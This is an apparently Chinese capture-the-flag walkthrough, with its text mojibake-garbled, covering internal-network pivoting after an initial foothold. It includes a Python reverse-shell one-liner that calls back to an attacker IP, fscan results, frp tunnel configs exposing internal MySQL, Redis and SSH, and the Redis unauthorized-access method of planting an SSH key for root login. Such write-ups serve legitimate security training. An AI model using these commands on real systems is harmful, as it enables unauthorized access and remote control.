<p>åˆ°ç°åœ¨å¤–ç½‘åŸºæœ¬æ‹¿ä¸‹äº†æ¥ä¸‹æ¥éœ€è¦å†…ç½‘æ¸—é€æ ¹æ®é¢˜ç›®æç¤ºéœ€è¦è¯»å–æ ¹ç›®å½•çš„æç¤ºæ–‡ä»¶</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923144614869.png" alt="image-20230923144614869"></p>
<p>ç”±äºè¯¥é¡µé¢æ“ä½œä¸æ˜¯ç‰¹åˆ«å‹å¥½åå¼¹ä¸€ä¸ªshellåœ¨vpsä¸Šä»¥ä¾¿åç»­æ“ä½œ</p>
<p>åå¼¹shellç”Ÿæˆç½‘ç«™ï¼š<a href="https://www.ddosi.org/shell/">åå¼¹shellå‘½ä»¤åœ¨çº¿ç”Ÿæˆå™¨|ğŸ”°é›¨è‹ğŸ”° (ddosi.org)</a></p>
<pre><code class="bash">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-ip&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145032369.png" alt="image-20230923145032369"></p>
<p>æ ¹æ®å‰é¢çš„æç¤ºéœ€è¦å¯¹å†…ç½‘è¿›è¡Œæ‰«æï¼Œä½¿ç”¨fscanå·¥å…·å¯¹å…¶å®ƒä¸»æœºè¿›è¡Œä¸€ä¸ªåˆæ­¥çš„åˆ¤æ–­</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145238948.png" alt="image-20230923145238948"></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145730806.png" alt="image-20230923145730806"></p>
<pre><code class="bash">172.20.0.1:888 open
172.20.0.2:22 open
172.20.0.1:22 open
172.20.0.1:21 open
172.20.0.2:6379 open
172.20.0.4:8080 open
172.20.0.1:80 open
172.20.0.3:3306 open
172.20.0.1:3306 open
172.20.0.1:7777 open
</code></pre>
<p>æ’é™¤ç½‘å…³åœ°å€å­˜åœ¨mysqlå’Œredisæ ¹æ®é¢˜ç›®è¦æ±‚å¯è§£å‡ºç¬¬äºŒä¸ªå‹ç¼©åŒ…å¯†ç </p>
<p><strong>22-3306-6379-8080</strong></p>
<pre><code>å½“ä½ çœ‹åˆ°æ­¤éƒ¨åˆ†ï¼Œè¯æ˜ä½ æ­£ç¡®çš„è¿›è¡Œäº†fscançš„æ“ä½œå¾—åˆ°äº†æ­£ç¡®çš„ç»“æœ
å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æœ¬å†…ç½‘ä¸‹è¿˜æœ‰å¦å¤–ä¸¤å°æœåŠ¡å™¨
å…¶ä¸­ä¸€å°å¼€å¯äº†22(ssh)å’Œ6379(redis)ç«¯å£
å¦ä¸€å°å¼€å¯äº†3306(mysql)ç«¯å£
è¿˜æœ‰ä¸€å°æ­£æ˜¯ä½ è®¿é—®åˆ°çš„ç•™è¨€æ¿æœåŠ¡
æ¥ä¸‹æ¥ï¼Œä½ å¯èƒ½éœ€è¦æ­å»ºä»£ç†ï¼Œä»è€Œä½¿ä½ çš„æœ¬æœºèƒ½ç›´æ¥è®¿é—®åˆ°å†…ç½‘çš„æœåŠ¡å™¨
æ­¤å¤„å¯äº†è§£`nps`å’Œ`frp`ï¼ŒåŒæ ·åœ¨/app/toolså·²å†…ç½®äº†ç›¸åº”æ–‡ä»¶
è¿æ¥ä»£ç†ï¼Œæ¨è`proxychains`
å¯¹äºmysqlæœåŠ¡å™¨ï¼Œä½ éœ€è¦æ‰¾åˆ°å…¶è´¦å·å¯†ç å¹¶æˆåŠŸè¿æ¥ï¼Œåœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°flag2
å¯¹äºredisæœåŠ¡å™¨ï¼Œä½ å¯ä»¥å­¦ä¹ å…¶ç›¸å…³çš„æ¸—é€æŠ€å·§ï¼Œä»è€Œè·å–åˆ°redisçš„æƒé™ï¼Œå¹¶è¿›ä¸€æ­¥å¯»æ‰¾å…¶getshellçš„æ–¹å¼ï¼Œæœ€ç»ˆå¾—åˆ°flag3
</code></pre>
<p>åˆ°è¿™é‡Œå°±éœ€è¦æ­å»ºä»£ç†è¿›è¡Œå†…ç½‘æ¸—é€äº†æ¨èä½¿ç”¨frpè¿›è¡Œå†…ç½‘ç©¿é€VPSæ­å»ºå¥½æœåŠ¡ç«¯</p>
<p>åŸºæœ¬é…ç½®å¦‚ä¸‹</p>
<pre><code class="bash">[common]
bind_port = 7000
</code></pre>
<p>æ¥ä¸‹æ¥æ˜¯å®¢æˆ·ç«¯é…ç½®</p>
<pre><code class="bash">[common]
server_addr=vps-addr
server_port=7000
[socks5_proxy]
remote_port = 6005
plugin = socks5
[mysql]
type = tcp
local_ip = 172.20.0.3
local_port = 3306
remote_port = 6001
</code></pre>
<p>ç”±äºåå¼¹shellä¸å¤ªå¥½å†™å…¥åªèƒ½ä¸€è¡Œä¸€è¡Œçš„è¿›è¡Œå†™å…¥</p>
<p><a href="https://blog.csdn.net/frdevolcqzyxynjds/article/details/106785218">linuxä¹‹echoå†™å…¥å•è¡Œæ–‡ä»¶ï¼Œcatå†™å…¥å¤šè¡Œæ–‡ä»¶_echoå†™å…¥å¤šè¡Œ_é—­å…³è‹¦ç‚¼å†…åŠŸçš„åšå®¢-CSDNåšå®¢</a></p>
<p>é“¾æ¥VPS IPå³å¯å¯†ç åœ¨ç½‘ç«™æ ¹ç›®å½•æœ‰ç»™å‡º</p>
<pre><code>passwd=&quot;The_P0sswOrD_Y0u_Nev3r_Kn0w&quot;
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923160506306.png" alt="image-20230923160506306"></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923160820637.png" alt="image-20230923160820637"></p>
<p>æ¥ä¸‹æ¥éœ€è¦åˆ©ç”¨å†…ç½‘çš„redisè¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œä¿®æ”¹frpé…ç½®æ–‡ä»¶è¿æ¥redis</p>
<p><a href="https://blog.csdn.net/FryhRx/article/details/124087653">redisæœªæˆæƒè®¿é—®æ¼æ´ä¸‰ç§ææƒæ–¹å¼_redisææƒ_é‡äº‹ä¸å†³ï¼Œå¯é—®æ˜¥é£ã€çš„åšå®¢-CSDNåšå®¢</a></p>
<pre><code>[redis]
type = tcp
local_ip = 172.20.0.2
local_port = 6379
remote_port = 6002
[ssh]
type = tcp
local_ip = 172.20.0.2
local_port = 22
remote_port = 6003
</code></pre>
<pre><code class="bash">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt
cat /root/.ssh/key.txt | redis-cli -h vps-ip -p 6002 -x set xxx
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923162650038.png" alt="image-20230923162650038"></p>
<p>å†™å…¥sshå…¬é’¥ä½¿ç”¨vpsç§é’¥è¿æ¥å³å¯åŒæ—¶ä¹Ÿéœ€è¦æŒ‚ä¸Šä»£ç†</p>
<p><strong>ssh -i id_rsa  root@vps-ip  -p 6003</strong></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923163217649.png" alt="image-20230923163217649"></p>
